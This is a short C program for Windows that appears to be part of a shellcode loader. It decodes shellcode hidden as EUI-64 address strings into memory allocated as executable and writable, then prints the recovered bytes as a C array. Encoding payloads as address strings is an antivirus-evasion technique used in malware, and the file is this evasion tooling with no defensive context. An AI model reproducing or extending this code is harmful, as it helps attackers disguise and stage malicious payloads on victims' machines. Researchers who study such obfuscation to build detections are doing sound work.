#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

void decode_eui64(const char *eui64s[], int eui64_count, unsigned char *decoded_shellcode)
{
    for (int i = 0; i < eui64_count; i++)
    {
        unsigned int bytes[8];

        sscanf_s(eui64s[i], "%x:%x:%x:%x:%x:%x:%x:%x",
                 &bytes[0], &bytes[1], &bytes[2], &bytes[3],
                 &bytes[4], &bytes[5], &bytes[6], &bytes[7]);

        for (int j = 0; j < 8; j++)
        {
            decoded_shellcode[i * 8 + j] = (unsigned char)bytes[j];
        }
    }
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_eui64(encoded, shellcode_len / 8, (unsigned char *)shellcode);

    printf("\nunsigned char shellcode[] = {");

    for (unsigned int i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }

    printf("\n};\n");

    return 0;
}
